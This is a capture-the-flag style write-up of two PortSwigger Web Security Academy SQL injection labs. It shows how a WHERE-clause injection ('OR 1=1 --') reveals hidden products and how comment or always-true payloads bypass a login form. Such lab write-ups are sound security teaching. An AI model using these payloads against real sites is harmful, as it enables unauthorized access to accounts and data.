## Labs Covered

This write-up focuses on the following **APPRENTICE-level labs** from the PortSwigger Web Security Academy related to **SQL Injection**:

**1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**  
<blockquote>
This lab demonstrates how an attacker can exploit SQL injection in the WHERE clause to extract data that is normally hidden or filtered.
</blockquote>

**2 SQL injection vulnerability allowing login bypass** 
<blockquote>
This lab shows how SQL injection can be used to bypass authentication mechanisms and gain unauthorized access.
</blockquote>

---

### LAB 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Lab Description

![image](https://github.com/user-attachments/assets/335cfde7-ac3a-49c0-8259-074537e8121d)

### Solution


When the buttons are clicked it is filtered by category,So we navigate to gift:

Query made - 
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```
![image](https://github.com/user-attachments/assets/83dd03bb-3eff-4a4f-bff0-9d6d1f2d627b)

The above is done with a GET request:

![image](https://github.com/user-attachments/assets/b75e508d-a3bb-46e5-998f-021e874e6f6b)


Using the following payload **Gifts' --**  we get 4 items instead of only 3, because it shows both the released and the hidden one:!

![image](https://github.com/user-attachments/assets/60f7aa97-dafc-46df-a552-7ff547c0a189)

To view all the products (both released and not released) , we include **Gifts' OR 1=1 --** so that it the condition evaluates to TRUE & displayed all the gifts.

The query looks like 

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1`
```

![image](https://github.com/user-attachments/assets/c7a1c09e-8971-4d86-b3cc-260fe58d896e)


> NOTE - URL encode before forwarding the request

![image](https://github.com/user-attachments/assets/c5b93fe8-8583-45bb-a657-7b69ab9e80f1)


---

### LAB 2 - SQL injection vulnerability allowing login bypass

### Lab Description
![image](https://github.com/user-attachments/assets/80bedfbb-aa64-4b88-ab21-f7dd0f82bf67)

### Solution

First we login as random user

![image](https://github.com/user-attachments/assets/d5f30649-07ab-448b-85a7-bcc57ebd78e9)

The login functionality works with a POST request:

![image](https://github.com/user-attachments/assets/4954b6f0-8e37-4d7a-9907-b45f209ab00f)

Query made -

```sql
SELECT * FROM users WHERE username = 'test' AND password = 'test'
```

To bypass the login, we need to comment out the password part in WHERE clause.

```sql
SELECT * FROM users WHERE username = 'administrator5'--' AND password = 'test'
```

or we can input correct used and make password statment true
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = '+or'1'='1
```
Using the following payload in the password field it is possible to login:

**'+or'1'='1**

![image](https://github.com/user-attachments/assets/27c0088c-f0dd-4636-bb55-feab817e9b01)

Lab is solved

![image](https://github.com/user-attachments/assets/ee3c01e9-4042-42f2-bb20-331e262e517f)


